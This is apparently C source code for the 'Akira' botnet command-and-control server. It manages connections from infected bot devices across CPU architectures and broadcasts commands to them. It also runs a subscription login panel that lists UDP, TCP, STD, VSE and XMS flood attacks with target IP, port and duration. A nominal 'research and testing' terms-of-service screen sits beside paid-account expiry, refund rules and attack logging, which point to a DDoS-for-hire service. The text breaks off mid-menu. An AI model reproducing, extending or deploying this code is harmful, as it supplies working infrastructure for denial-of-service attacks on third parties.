/*
    Permission To Use, Copy, Modify, And Distribute This Ware And Its Documentation For Education And Research, Without Fee Or A Signed Agreement, Is Granted,-
    Provided That This And The Following Two Paragraphs Appear In All Copies, Modifications, And Distributions. (Dec. 2020)

    This Ware Is Offered As-Is and As-Available, And Makes No Representations Or Warranties Of Any Kind Concerning This Material, Whether Express, Implied, Statutory, Or Other.
    This Includes, Without Limitation, Warranties Of Title, Merchantability, Fitness For A Particular Purpose, Non-Infringement, Absence Of Latent Or Other Defects, Accuracy,-
    Or The Presence Or Absence Of Errors, Whether Or Not Known Or Discoverable.

    To The Extent Possible, In No Event Shall The Author Be Liable To You On Any Legal Theory (Including, Without Limitation, Negligence)
    Or Otherwise For Any Direct, Indirect, Special, Incidental, Consequential, Punitive, Exemplary,-
    Or Any Other Losses, Costs, Expenses, Or Damages (Including, But Not Limited To, Loss Of Use, Data, Profits, Or Business Interruption)-
    However Caused, And On Any Theory Of Liability, Whether In Contract, Strict Liability, Or Tort (Including Negligence Or Otherwise)-
    Arising Out Of This Public Release, Or Use Of This Ware, Even If The User Has Been Advised Of The Possibility Of Such Losses, Costs, Expenses, Or Damages.
*/
/*
    Akira C2 By Tragedy

    Valid IP Log for User Connections
    
    Account Expiry
    Max Flood Time
    Cooldown

    Server CMDs:
        Log IPs For Future Reference
        View Your Past Attacks
        Direct Message Online Users
        Change Bash Prompt   

    Admin Terminal CMDs:
        Add/Delete Valid IPs
        Add/Edit/Delete Accounts
        Kick User From CNC
        Kill All Bots 
*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <err.h> 
#include <errno.h>
#include <ctype.h> 
#include <fcntl.h>
#include <netdb.h>
#include <net/if.h> 
#include <dirent.h>
#include <signal.h>
#include <pthread.h>
#include <sys/time.h>   
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/epoll.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip_icmp.h> 
#include <sys/socket.h> 
#include <linux/limits.h>

#define MXFDS 10000
#define BUFSIZE 2048 //Max Size Of Input Buffer (Leave It High To Avoid Overflow)
#define MXPRMS 20 //Maximum Parameters For Split Func
//[+]====================================================================================================[+]
#define CNCPORT 777 //Desired C2 Port                              

#define VALIDLOG "/root/Akira/AkiraLogs/VALID.log" //Only IPs In This File Can Connect To C2
#define DB "/root/Akira/DB.txt" //Account Information File            
#define LFD "/root/Akira/AkiraLogs" //Log File Directory

unsigned int TOS = 1; //1 To Enable TOS, 0 To Disable
//[+]====================================================================================================[+]

#define CLS "\e[1;1H\e[2J"
#define W "\x1b[37m"
#define R "\x1b[31m"
#define G "\x1b[32m"
#define Y "\x1b[33m" 
#define CY "\x1b[31m"
#define CR "\x1b[0m"
#define BLK "\x1b[30m"
#define UND "\x1b[4;37m"
#define NUND "\x1b[24;34m"
#define AkiraY ""W"["CY"+"W"]"
#define AkiraN ""W"[\x1b[31m-"W"]"

//Static To Hold Value Throughout Program Loop, Volatile To Stay Dynamic
static volatile int Enthusiasts = 0;
static volatile int EpollFD = 0;
static volatile int BotListenFD = 0;

struct Profile{
    char user[20];
    char pass[20];
    char priv[10];
    char expiry[20];
    int maxsecs;
    int cooldown;
} stats[MXFDS];

struct Enthusiasts{
    char ip[16];
    int connd;
    char nick[20];
    int priv;
    char myprompt[30];
    char expiry[20];
    int maxsecs;
    int cooldown;
    int cdsecs;
    int cdstatus;
} users[MXFDS];

struct CooldownArgs{
    int sock;
    int seconds;
};
void En_Cooldown(void *arguments){
    struct CooldownArgs *args = arguments;
    int fd = (int)args->sock;
    int seconds = (int)args->seconds;
    users[fd].cdsecs = 0;
    time_t start = time(NULL);
    if(users[fd].cdstatus == 0)
        users[fd].cdstatus = 1;
    while(users[fd].cdsecs++ <= seconds) sleep(1);
    users[fd].cdsecs = 0;
    users[fd].cdstatus = 0;
    return;
}

struct ListenerArgs{
    int sock;
    uint32_t ip;
};

struct BotData{
    uint32_t ip;
    char connd;
    char arch[30];
} bots[MXFDS];

unsigned int mips, mipsel, arm, x86, spfx86, ppc, superh, m68k, sparc, unknown, debug = 0;


/*Functions For Removing Empty Lines After Utilizing 'sed'
  Checks Whether A Given String Is Empty Or Not
  A String Is Empty If It Only Contains White Space Characters
  Returns 1 If Given String Is Empty, Otherwise 0.*/
int IsBlank(const char *str){
    char ch;
    do{ ch = *(str++);
        //Check For Non-Whitespace Character
        if(ch != ' ' && ch != '\t' && ch != '\n' && ch != '\r' && ch != '\0') return 0;
    } while(ch != '\0'); return 1;
}
//If Current Line is Not Empty, Write It To Temp File
void SaveValidLines(FILE *srcFile, FILE *tempFile){
    char buffer[2048];
    while((fgets(buffer, 2048, srcFile)) != NULL){
        if(!IsBlank(buffer)) fputs(buffer, tempFile);
    }
}
void RemoveEmpties(char *file){
    char cleanfile[0x100];
    snprintf(cleanfile, sizeof(cleanfile), "%s", file);
    FILE *srcFile = fopen(cleanfile, "r"); FILE *tempFile = fopen(""LFD"/rmblanks.tmp", "a+");
    if(srcFile == NULL || tempFile == NULL) printf("Cannot Remove Empty Lines, Fix It!\n");
    //Save Valid Lines To Temporary File
    SaveValidLines(srcFile, tempFile);
    fclose(srcFile); fclose(tempFile);
    //Delete Src File And Rename Temp File As Source
    remove(cleanfile);
    char oldName[100], newName[100];
    sprintf(oldName, ""LFD"/rmblanks.tmp"); sprintf(newName, "%s", cleanfile);
    if(rename(oldName, newName) == 0){ /*Do Nothing, Straight Logic*/ }
    else printf("\x1b[31mCouldn't Clean File..."CR"\n");
}
//Func For Removing A String Which Contains/Is A Specified Character/String
void rmstr(char *str, char *file){
    char rmstr[1024];
    snprintf(rmstr, sizeof(rmstr), "sed -i '/%s/d' %s", str, file); system(rmstr);
    memset(rmstr, 0, sizeof(rmstr));
    return;
}
//Func For Splitting A String Into Arguments 
int split_argc = 0;
char *split_argv[MXPRMS + 1] = { 0 };
void Split_Str(char *strr){
    int i = 0; for(i = 0; i < split_argc; i++) split_argv[i] = NULL;
    split_argc = 0;
    char *token = strtok(strr, " ");
    while(token != NULL && split_argc < MXPRMS){
        split_argv[split_argc++] = malloc(strlen(token) + 1);
        strcpy(split_argv[split_argc - 1], token);
        token = strtok(NULL, " ");
    }
}

int CheckBlacklist(char *targ){
    char *line = NULL;
    size_t n = 0;
    FILE *f = fopen(""LFD"/BLACK.lst", "r");
    while(getline(&line, &n, f) != -1){
        if(!strcmp(line, targ)) return 1;
    } fclose(f); return 0;
}

//[+]===================================================================[+]
//Sock And Bind From qBot
static int NBSock (int sfd){
    int flags, s;
    flags = fcntl(sfd, F_GETFL, 0);
    if(flags == -1){ perror("fcntl"); return -1; }
    flags |= O_NONBLOCK;
    s = fcntl(sfd, F_SETFL, flags); 
    if(s == -1){ perror("fcntl"); return -1; }
    return 0;
}
static int CBind (char *port){
    struct addrinfo hints;
    struct addrinfo *result, *rp;
    int s, sfd;
    memset(&hints, 0, sizeof(struct addrinfo));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo(NULL, port, &hints, &result);
    if(s != 0){ fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s)); return -1; }
    for(rp = result; rp != NULL; rp = rp->ai_next){
        sfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if(sfd == -1) continue;
        int yes = 1;
        if(setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
        s = bind(sfd, rp->ai_addr, rp->ai_addrlen); 
        if(s == 0) break;
        close(sfd);
    }
    if(rp == NULL){ fprintf(stderr, "Change The Port Idiot\n"); return -1; }
    freeaddrinfo(result);
    return sfd;
}

//[+]====================== Basic Prefunctions =========================[+]
char day[15], month[15], year[15];
int Get_Time(void){
    if(strlen(day) > 0) memset(day, 0, sizeof(day));
    if(strlen(month) > 0) memset(month, 0, sizeof(month));
    if(strlen(year) > 0) memset(year, 0, sizeof(year));
    
    time_t timer;
    struct tm* tm_info;
    time(&timer);
    tm_info = localtime(&timer);
    strftime(day, 3, "%d", tm_info);
    strftime(month, 3, "%m", tm_info);
    strftime(year, 5, "%Y", tm_info);
    return 0;
}
void trim(char *str){
    int i; int begin = 0;
    int end = strlen(str) - 1;
    while(isspace(str[begin])) begin++;
    while((end >= begin) && isspace(str[end])) end--;
    for(i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
const char *Get_Host(uint32_t addr){
    struct in_addr in_addr_ip;
    in_addr_ip.s_addr = addr;
    return inet_ntoa(in_addr_ip);
}

int fdgets(unsigned char *buffer, int bufferSize, int fd){
    int total = 0, got = 1;
    while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n'){ got = read(fd, buffer + total, 1); total++; }
    return got;
}
//[+]==========================================================[+]
//Run Epoll
void *EpollEventLoop(void *useless){
    struct epoll_event event;
    struct epoll_event *events;
    int s, x = 0;
    events = calloc(MXFDS, sizeof(event));
    while(1){
        int n, i;
        n = epoll_wait(EpollFD, events, MXFDS, -1);
        for(i = 0; i < n; i++){
            if((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))){
                bots[events[i].data.fd].connd = 0;
                close(events[i].data.fd);
                continue;
            }
            else if(BotListenFD == events[i].data.fd){
                while(1){
                    struct sockaddr in_addr;
                    socklen_t in_len;
                    int inputfd, ipIndex;
                    in_len = sizeof(in_addr);
                    inputfd = accept (BotListenFD, &in_addr, &in_len);
                    if(inputfd == -1){
                        if((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                        else{ perror ("accept"); break; }
                    }
                    bots[inputfd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
                    int multiple = 0;
                    for(ipIndex = 0; ipIndex < MXFDS; ipIndex++){
                        if(!bots[ipIndex].connd || ipIndex == inputfd) continue;
                        if(bots[ipIndex].ip == bots[inputfd].ip){ multiple = 1; break; }
                    }
                    if(multiple){
                        if(send(inputfd, "KILL\n", 11, MSG_NOSIGNAL) == -1){ close(inputfd); continue; }
                        close(inputfd);
                        continue;
                    }
                    //Make NB Sock
                    s = NBSock(inputfd);
                    if(s == -1){ close(inputfd); break; }

                    event.data.fd = inputfd;
                    event.events = EPOLLIN | EPOLLET;
                    s = epoll_ctl (EpollFD, EPOLL_CTL_ADD, inputfd, &event);
                    if(s == -1){ perror ("epoll_ctl"); close(inputfd); break; }
                    bots[inputfd].connd = 1;
                }
                continue;
            }
            else{
                int outputfd = events[i].data.fd;
                struct BotData *client = &(bots[outputfd]);
                int done = 0;
                client->connd = 1;
                while(1){
                    ssize_t count;
                    char buf[2048];
                    memset(buf, 0, sizeof(buf));
                    while(memset(buf, 0, sizeof(buf)) && (count = fdgets(buf, sizeof(buf), outputfd)) > 0){
                        if(strstr(buf, "\n") == NULL){ done = 1; break; }
                        trim(buf);
                        if(strcmp(buf, "PING") == 0){
                            if(send(outputfd, "PONG\n", 5, MSG_NOSIGNAL) == -1){ done = 1; break; }
                            continue;
                        }
                        else if(strcmp(buf, "PONG") == 0) continue;
                        else if(strstr(buf, "arch ") != NULL){
                            char *arch = strstr(buf, "arch ") + 5;
                            strcpy(bots->arch, arch);
                            strcpy(bots[outputfd].arch, arch);
                            printf("  "W"["CY"マント"W"] | ["CY"%s"W"] %s \x1b[1;4;32mConnected\x1b[1;24;37m\n", arch, Get_Host(client->ip));
                        }
                        else{
                            int dummy = 0;
                            dummy = 1;
                            //printf("buf: \"%s\"\n", buf);
                        }
                    }
                    if(count == -1){
                        if(errno != EAGAIN) done = 1;
                        break;
                    }
                    else if(count == 0){ done = 1; break; }
                }
                if(done){
                    client->connd = 0;
                    snprintf(client->arch, sizeof(client->arch), "%s", "Rip");
                    snprintf(client[outputfd].arch, sizeof(client[outputfd].arch), "%s", "Rip");
                    close(outputfd);
                }
            }
        }
    }
}
void Broadcast(char *message){
    char *cpy = malloc(strlen(message) + 10);
    memset(cpy, 0, strlen(message) + 10);
    strcpy(cpy, message);
    trim(cpy);
    int i; for(i = 0; i < MXFDS; i++){
        if((!bots[i].connd && !users[i].connd)) continue;
        if(strlen(message) < 1) return;
        if(bots[i].connd){
            send(i, message, strlen(message), MSG_NOSIGNAL);
            send(i, "\r\n", 2, MSG_NOSIGNAL);
        }
        else continue;
    } free(cpy);
}
unsigned int CountDevices(){
    int i = 0, total = 0;
    for(i = 0; i < MXFDS; i++){ if(!bots[i].connd) continue; total++; }
    return total;
}
void CountArchs(){
    mips = 0; mipsel = 0; x86 = 0; arm = 0; ppc = 0; superh = 0; m68k = 0; sparc = 0; unknown = 0; debug = 0;
    int x; for(x = 0; x < MXFDS; x++){
        if(strstr(bots[x].arch, "mips") && bots[x].connd == 1) mips++;
        else if(strstr(bots[x].arch, "mipsel") && bots[x].connd == 1) mipsel++;
        else if(strstr(bots[x].arch, "armv4") && bots[x].connd == 1) arm++;
        else if(strstr(bots[x].arch, "armv5") && bots[x].connd == 1) arm++;
        else if(strstr(bots[x].arch, "armv6") && bots[x].connd == 1) arm++;
        else if(strstr(bots[x].arch, "armv7") && bots[x].connd == 1) arm++;
        else if(strstr(bots[x].arch, "x86") && bots[x].connd == 1) x86++;
        else if(strstr(bots[x].arch, "ppc") && bots[x].connd == 1) ppc++;
        else if(strstr(bots[x].arch, "superh") && bots[x].connd == 1) superh++;
        else if(strstr(bots[x].arch, "m68k") && bots[x].connd == 1) m68k++;
        else if(strstr(bots[x].arch, "sparc") && bots[x].connd == 1) sparc++;
        else if(strstr(bots[x].arch, "unknown") && bots[x].connd == 1) unknown++;
        else if(strstr(bots[x].arch, "debug") && bots[x].connd == 1) debug++;
    }
}

void *TitleWriter(void *sock){
    int akirafd = (int)sock;
    char titlebar[2048];
    while(1){
        memset(titlebar, 0, sizeof(titlebar));
        sprintf(titlebar, "%c]0; Devices: %d | Operators: %d %c", '\033', CountDevices(), Enthusiasts, '\007');
        if(send(akirafd, titlebar, strlen(titlebar), MSG_NOSIGNAL) == -1) return; 
        sleep(3);
    }
}

//CNC
void *CommandAndControl(void *arguments){
    struct ListenerArgs *args = arguments;
    int akirafd = (int)args->sock;
    const char *userIP = Get_Host(args->ip);
#ifdef DEBUG
    printf("Operator: %s\n", userIP);
#endif

    char akira[2048]; //Setting It High To Avoid Overflow
    char buf[BUFSIZE];

    //Block Local Host - Hosting Company Cannot Access Program (Would Be Blocked Anyways)
    if(!strcmp(userIP, "127.0.0.1")){
        sprintf(akira, "\x1b[31mError, You Cannot Access This C2 from Localhost, Sorry...\r\n");
        send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
        sleep(1);
        goto close;
    }

    //Check If Address Is Valid
    int valid_con = 0;
    char *line = NULL;
    size_t n = 0;
    FILE *val = fopen(VALIDLOG, "r");
    if(val == NULL){ printf("\x1b[31mValid Address Log Not Found! Exiting...\n"); sleep(3); exit(0); }
    while(getline(&line, &n, val) != -1){
        if(strstr(line, userIP) != NULL) valid_con = 1;
    } fclose(val); free(line);
    if(valid_con == 1){ /*Connection Is Valid - Do Nothing, Straight Logic*/ }
    else{
        //Not A Valid IP
        /*FILE *logFile;
        logFile = fopen(""LFD"/INVALID.log", "a+");
        fprintf(logFile, "Invalid IP (%s)\n", userIP);
        printf(""CY"[\x1b[31m!!!"CY"] \x1b[31mInvalid IP"CY"(\x1b[31m%s"CY") "CY"[\x1b[31m!!!"CY"]\n", userIP);
        fclose(logFile);*/
        //^ Probably Not A Good Idea.. Essentially A Self-Inflicted CNC Flood
        goto close;
    }

    //Load Database
    FILE *database;
    int a, b, c = 0;
    database = fopen(DB, "r");
    if(database == NULL){ printf("\x1b[31mDatabase Not Found! Exiting...\n"); sleep(3); exit(0); }
    else if(database != NULL){
        while(!feof(database)){ c = fgetc(database); a++; }
        rewind(database);
        while(b != a - 1){ fscanf(database, "%s %s %s %s %d %d", stats[b].user, stats[b].pass, stats[b].priv, stats[b].expiry, &stats[b].maxsecs, &stats[b].cooldown); b++; }
    } fclose(database);

    //Terms Of Service
    if(TOS > 0){
        char tos [1500] = {""CLS""AkiraY" Terms Of Service "AkiraY"\r\n\r\n"Y"I Understand That"CY":\r\n "Y"- "CY"This Service Is Provided Strictly For Research And Testing\r\n "Y"- "CY"This Service Exists So That We May Better Understand These Methods\r\n "Y"- "CY"DEVELOPERS Use This Service To Learn About And Protect Their Servers From\r\n Potential Malicious Traffic\r\n "Y"*- "CY"If I Attempt To Bypass Any Restrictions On My Account My Account Can/Will be Suspended\r\n"Y"I Accept That"CY":\r\n "Y"- "CY"When Contacted By Administrators, I Am Obligated To Comply With Their\r\n Statements \r\n "Y"- "CY"If My Account Is Suspended For My Own Behavior, I Will Not Receive A Refund\r\n "Y"- "CY"If I Am Found Tampering With This Service Without Permission, I Will Be\r\n Suspended\r\n"Y"I ACKNOWLEDGE That What I Do With This Service Is My Own Responsibility\r\n"Y"I RECOGNIZE That If My Account Is Suspended By An Admin I Will Not Claim I've\r\n Been Scammed Or Ask For A Refund\r\n\r\n\t\t"CY"╔══════════╗   ╔══════════╗\r\n\t\t║ "G"A.Accept "CY"║   ║ \x1b[31mR.Refuse "CY"║\r\n\t\t╚══════════╝   ╚══════════╝"CR"\r\n"Y"("G"A"Y"/\x1b[31mR"Y"): "};
        send(akirafd, tos, strlen(tos), MSG_NOSIGNAL);
        memset(buf, 0, sizeof(buf));
        fdgets(buf, sizeof(buf), akirafd); trim(buf);
        if(!strcmp(buf, "a") || !strcmp(buf, "A")){ /*Do Nothing, Straight Logic*/ }
        else goto close;
    }

    //Prompt For Username 
    promptuser:;
    char stateduser[BUFSIZE];
    sprintf(akira, ""CLS""CY"Username"W": ");
    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
    fdgets(stateduser, sizeof(stateduser), akirafd); trim(stateduser);

    //Check That It's A Valid Username
    char userprofile[200]; //If Username Is Found, We'll Save Args To Profile
    FILE *checkdb;
    char *lin = NULL;
    size_t len = 0;
    ssize_t readdb;
    int found = 0;
    checkdb = fopen(DB, "r");
    while((readdb = getline(&lin, &len, checkdb)) != -1 && found == 0){
        int split_wargc = 0;
        char *split_wargv[MXPRMS + 1] = { 0 };
        char *token = strtok(lin, " ");
        while(token != NULL && split_wargc < MXPRMS){
            split_wargv[split_wargc++] = malloc(strlen(token) + 1);
            strcpy(split_wargv[split_wargc - 1], token);
            token = strtok(NULL, " ");
        }
        if(!strcmp(split_wargv[0], stateduser)){
            found = 1;
            sprintf(userprofile, "%s %s %s %s %s %s", split_wargv[0], split_wargv[1], split_wargv[2], split_wargv[3], split_wargv[4], split_wargv[5]);
        }
        /*int c;
        for(c = 0; c < split_wargc; c++) memset(split_wargv[c], 0, sizeof(split_wargv[c]));
        split_wargc = 0;*///Should Reset Every Time Anyways
    }
    free(lin);
    fclose(checkdb);

    if(found == 0){
        //Username Is Not Valid
        send(akirafd, "\033[1A", 5, MSG_NOSIGNAL);
        sprintf(akira, "\x1b[31mInvalid Username! Attempt Logged!\r\n");
        send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);

        FILE *logFile;
        logFile = fopen(""LFD"/FAILED_LOGINS.log", "a");
        fprintf(logFile, "Failed Username (%s - %s)\n", userIP, buf);
        printf(""W"[\x1b[31m!!!"W"] \x1b[31mFailed Username "W"(\x1b[31m%s - %s"W") "W"[\x1b[31m!!!"W"]\n", userIP, buf);
        fclose(logFile);
        sleep(2);
        goto close;
    }
    else if(found == 1){
        //Username Is Valid - Check That It's Not Already Logged In
        int nickcheck; for(nickcheck = 0; nickcheck < MXFDS; nickcheck++){
            if(!strcmp(users[nickcheck].nick, stateduser)){
                sprintf(akira, "\x1b[31mError, User Is Already Logged In On This Network!\r\n");
                send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                sleep(3);
                goto close;
            }
        }
        //Not Logged In, Split Database String
        Split_Str(userprofile);
        //Check That It Hasn't Expired
        Get_Time();
        snprintf(users[akirafd].expiry, sizeof(users[akirafd].expiry), "%s", split_argv[3]);
        
        int split_nuargc = 0; //Split Third Argument From Database String (Expiry) At The '/' Characters
        char *split_nuargv[MXPRMS + 1] = { 0 };
        char *ttoken = strtok(split_argv[3], "/");
        while(ttoken != NULL && split_nuargc < MXPRMS){
            split_nuargv[split_nuargc++] = malloc(strlen(ttoken) + 1);
            strcpy(split_nuargv[split_nuargc - 1], ttoken);
            ttoken = strtok(NULL, "/");
        }
        char exp_day[10];
        char exp_month[10];
        char exp_year[10];
        sprintf(exp_day, "%s", split_nuargv[0]);
        sprintf(exp_month, "%s", split_nuargv[1]);
        sprintf(exp_year, "%s", split_nuargv[2]);
#ifdef DEBUG
        printf("Logging In:%s - Expiry(D:%sM:%sY:%s)\n", stateduser, exp_day, exp_month, exp_year);
#endif
        if(atoi(year) > atoi(exp_year) || atoi(day) > atoi(exp_day) && atoi(month) >= atoi(exp_month) && atoi(year) == atoi(exp_year) || atoi(month) > atoi(exp_month) && atoi(year) >= atoi(exp_year)){
            //Acount Is Expired
            send(akirafd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL);
            sprintf(akira, "\t\x1b[31mYour "CY"Akira \x1b[31mAccount Has Expired\r\n\tMessage an Admin to Renew Subscription.\r\n"CR"");
            send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
            sleep(5);
            goto close;
        }
        //Account Has Not Expired, Prompt For Password
        char passatt[100];
        sprintf(akira, ""CY"%s's Password"W": "BLK"", stateduser);
        send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
        fdgets(passatt, sizeof(passatt), akirafd); trim(passatt);

        if(!strcmp(split_argv[1], passatt)){ /*Correct Password, Do Nothing, Straight Logic*/ }
        else{
            //Invalid Password
            send(akirafd, "\033[1A", 5, MSG_NOSIGNAL);
            sprintf(akira, "\x1b[31mInvalid Password! Attempt Logged!\r\n");
            send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
            FILE *logFile;
            logFile = fopen(""LFD"/FAILED_LOGINS.log", "a");
            fprintf(logFile, "Failed Password (%s - %s)\n", userIP, passatt);
            printf(""W"[\x1b[31m!!!"W"] \x1b[31mFailed Password "W"(\x1b[31m%s - %s"W") "W"[\x1b[31m!!!"W"]\n", userIP, passatt);
            fclose(logFile);
            memset(buf, 0, sizeof(buf));
            sleep(2);
            goto close;
        }
    }
    memset(buf, 0, sizeof(buf));

    //[+]===================================================================================================================[+]
    //Successful Login, +1 User Online
    Enthusiasts++;
    //Start Title Bar Thread
    pthread_t title;
    pthread_create(&title, NULL, &TitleWriter, akirafd);
    //Assign Session Nickname From Username
    snprintf(users[akirafd].nick, sizeof(users[akirafd].nick), "%s", split_argv[0]);
    //Log Connection If Desired
    if(!strcmp(users[akirafd].nick, "Admin") || !strcmp(users[akirafd].nick, "Tragedy")){ /*Do Nothing, Straight Logic*/ }
    else{
        time_t t = time(NULL);
        struct tm tm = *localtime(&t);
        FILE *conlog = fopen(""LFD"/User_Connections.log", "a+");
        fprintf(conlog, "[%s] -> [%s] - [%d/%d/%d %d:%d:%d]\n", users[akirafd].nick, userIP, tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
        fclose(conlog);
    }

    //Check Account Privileges
    if(!strcmp(split_argv[2], "1")){ users[akirafd].priv = 1; printf(AkiraY" "W"["CY"Admin("W"%s"CY":"W"%s"CY")"W"] \x1b[32mLogged In! "AkiraY"\x1b[0m\n", users[akirafd].nick, userIP); }
    else{ users[akirafd].priv = 0; printf(AkiraY" "W"["CY"User("W"%s"CY":"W"%s"CY")"W"] \x1b[32mLogged In! "AkiraY"\x1b[0m\n", users[akirafd].nick, userIP); }

    //Set Default Stats
    users[akirafd].connd = 1; //Set As Connected
    users[akirafd].maxsecs = atoi(split_argv[4]);
    users[akirafd].cooldown = atoi(split_argv[5]);

    sprintf(akira, ""CLS""CY"Welcome "W"%s"CY", To The "W"Akira C2"CY"...\r\n\r\n", users[akirafd].nick);
    send(akirafd, akira, strlen(akira), 0);
    sprintf(akira, " "CY"Account Expiry "W"- "Y"%s\r\n", users[akirafd].expiry);
    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
    char printpriv[10];
    if(!strcmp(split_argv[2], "1")) sprintf(printpriv, "ADMIN");
    else sprintf(printpriv, "REG");
    sprintf(akira, " "CY"Privileges "W"- "Y"%s "W"\r\n", printpriv);
    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
    sprintf(akira, " "CY"Max Flood Time "W"- "Y"%d\r\n", users[akirafd].maxsecs);
    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);

    unsigned int mylogged = 0;
    unsigned int myatks = 0;
    //Logged IPs
    FILE *iplog;
    char *linep = NULL;
    size_t lenp = 0;
    ssize_t readp;
    iplog = fopen(""LFD"/IPLog.log", "r");
    if(iplog == NULL){ sprintf(akira, "The Owner Broke The Logs...\r\n"); send(akirafd, akira, strlen(akira), MSG_NOSIGNAL); }
    while((readp = getline(&linep, &lenp, iplog)) != -1){
        if(strstr(linep, users[akirafd].nick)) mylogged++;
    } free(linep); fclose(iplog);
    sprintf(akira, " "CY"Logged IPs "W"- "Y"%d\r\n", mylogged);
    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
    //Attacks Sent
    FILE *vwatklog;
    char *linea = NULL;
    size_t lena = 0;
    ssize_t reada;
    vwatklog = fopen(""LFD"/ATKS.log", "r");
    if(vwatklog == NULL){ sprintf(akira, "The Owner Broke The Logs...\r\n"); send(akirafd, akira, strlen(akira), MSG_NOSIGNAL); }
    while((reada = getline(&linea, &lena, vwatklog)) != -1){
        if(strstr(linea, users[akirafd].nick)) myatks++;
    } free(linea); fclose(vwatklog);
    sprintf(akira, " "CY"Attacks Sent "W"- "Y"%d\r\n\r\n"CY"Type "W"HELP "CY"For The "W"Commands List"CY"...\r\n\r\n", myatks);
    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);

    //Set And Send Prompt
    sprintf(users[akirafd].myprompt, "Akira");
    char prompt[80];
    sprintf(prompt, ""W"["CY"%s"W"@"CY"%s"W"]: ", split_argv[0], users[akirafd].myprompt);
    send(akirafd, prompt, strlen(prompt), MSG_NOSIGNAL);


    //Wait For Input============================================================================================================================================================================================FdGets Loop=========[+]
    while(fdgets(buf, sizeof(buf), akirafd) > 0){ trim(buf);
        if(!strcmp(buf, ".logout") || !strcmp(buf, ".LOGOUT")) goto close;
        else if(!strcmp(buf, ".CLS") || !strcmp(buf, ".cls") || !strcmp(buf, ".CLEAR") || !strcmp(buf, ".clear") || !strcmp(buf, "CLS") || !strcmp(buf, "cls") || !strcmp(buf, "CLEAR") || !strcmp(buf, "clear")){
            send(akirafd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL);
            pthread_create(&title, NULL, &TitleWriter, akirafd);
            users[akirafd].connd = 1;
        }
        //Help Menu
        else if(!strcmp(buf, "help") || !strcmp(buf, "HELP")){
            sprintf(akira, "\r\n"CY".DDOS  "W"Displays DDoS Commands\r\n");
            send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
            sprintf(akira, ""CY".SERV  "W"Displays Server Commands\r\n");
            send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
            sprintf(akira, ""CY".ADMN  "W"Displays Admin Commands\r\n\r\n");
            send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
        }
        //DDoS Menu
        else if(!strcmp(buf, ".ddos") || !strcmp(buf, ".DDOS")){
            sprintf(akira, "\r\n\t "W"╔══════════════════════════╗\r\n");
            send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
            sprintf(akira, "\t "W"║  "CY"UDP "W"["CY"IP"W"] ["CY"PORT"W"] ["CY"TIME"W"]  ║\r\n");
            send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
            sprintf(akira, "\t "W"║  "CY"TCP "W"["CY"IP"W"] ["CY"PORT"W"] ["CY"TIME"W"]  ║\r\n");
            send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
            sprintf(akira, "\t "W"║  "CY"STD "W"["CY"IP"W"] ["CY"PORT"W"] ["CY"TIME"W"]  ║\r\n");
            send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
            sprintf(akira, "\t "W"║  "CY"VSE "W"["CY"IP"W"] ["CY"PORT"W"] ["CY"TIME"W"]  ║\r\n");
            send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
            sprintf(akira, "\t "W"║  "CY"XMS "W"["CY"IP"W"] ["CY"PORT"W"] ["CY"TIME"W"]  ║\r\n");
            send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
            sprintf(akira, "\t "W"╚══════════════════════════╝"CR"\r\n");
            send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
            sprintf(akira, "\t"CY".LOGIP  "W"Store An IP For Future Reference\r\n");
            send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
            sprintf(akira, "\t"CY".VWLOG  "W"View Your Stored IPs"CR"\r\n");
            send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
            sprintf(akira, "\t"CY".ATKLOG "W"Displays Your Past Attacks"CR"\r\n\r\n");
            send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
        }
        //Serv Menu
        else if(!strcmp(buf, ".serv") || !strcmp(buf, ".SERV")){
            sprintf(akira, ""CY".PROMPT   "W"Change Your Bash Prompt\r\n");
            send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
            sprintf(akira, ""CY".ACSTATS  "W"Shows Your Account Stats\r\n");
            send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
            sprintf(akira, ""CY".ONLINE   "W"Shows Online Users\r\n");
            send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
